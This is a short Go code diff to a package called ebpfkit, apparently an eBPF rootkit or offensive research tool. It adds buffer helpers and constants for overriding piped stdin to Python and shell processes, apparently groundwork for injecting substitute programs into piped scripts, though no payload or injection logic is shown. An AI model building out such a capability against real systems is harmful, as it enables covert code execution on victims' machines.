@@ -13,10 +13,10 @@ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
 */
-package ebpfKit
+package ebpfkit
 
 // Options contains the parameters
-type Options struct{
+type Options struct {
 	TargetHTTPServerPort int
 }
 
@@ -55,6 +55,18 @@ func NewHTTPDataBuffer(data string) [256]byte {
 	return rep
 }
 
+func NewCommBuffer(comm string) [16]byte {
+	rep := [16]byte{}
+	copy(rep[:], comm)
+	return rep
+}
+
+func NewPipedProgram(prog string) [500]byte {
+	rep := [500]byte{}
+	copy(rep[:], prog)
+	return rep
+}
+
 var (
 	// HealthCheckRequest is the default healthcheck request
 	HealthCheckRequest = NewHTTPDataBuffer("GET /healthcheck HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: localhost:8000")
@@ -64,9 +76,9 @@ var (
 
 type HTTPRoute struct {
 	HTTPAction HTTPAction
-	Handler HTTPHandler
+	Handler    HTTPHandler
 	NewDataLen uint32
-	NewData [256]byte
+	NewData    [256]byte
 }
 
 const (
@@ -74,4 +86,11 @@ const (
 	DNSMaxLength = 256
 	// DNSMaxLabelLength is the max size of a label in a DNS request or response
 	DNSMaxLabelLength = 63
+)
+
+const (
+	// PipeOverridePythonKey is the key used to override a piped stdin to a python process
+	PipeOverridePythonKey = uint32(1)
+	// PipeOverrideShellKey is the key used to override a piped stdin to a shell process
+	PipeOverrideShellKey = uint32(2)
 )
